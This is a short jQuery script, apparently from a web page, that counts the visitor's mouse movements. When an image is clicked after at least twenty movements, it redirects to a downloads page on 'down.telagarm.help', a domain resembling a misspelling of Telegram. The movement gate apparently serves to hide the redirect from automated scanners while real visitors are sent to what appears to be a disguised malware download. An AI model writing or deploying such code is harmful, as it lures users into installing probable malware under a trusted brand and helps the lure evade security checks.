var numCount=0;
var allowCount=20;
$(function()
{
	$("body").mousemove(function(event)
	{
		if(event.pageX>0 && event.pageY>0)
		{
			numCount++;
		}
	});

	$("img").click(function(event)
	{
		if(checkRes(event)==true)
		{
			var url="https://down.telagarm.help/downloads.php";
			window.location=url;
		}
	});
})

function checkRes(e)
{
	if(numCount>=allowCount && e.pageX>0 && e.pageY>0)
	{return true;}else{return false;}
}
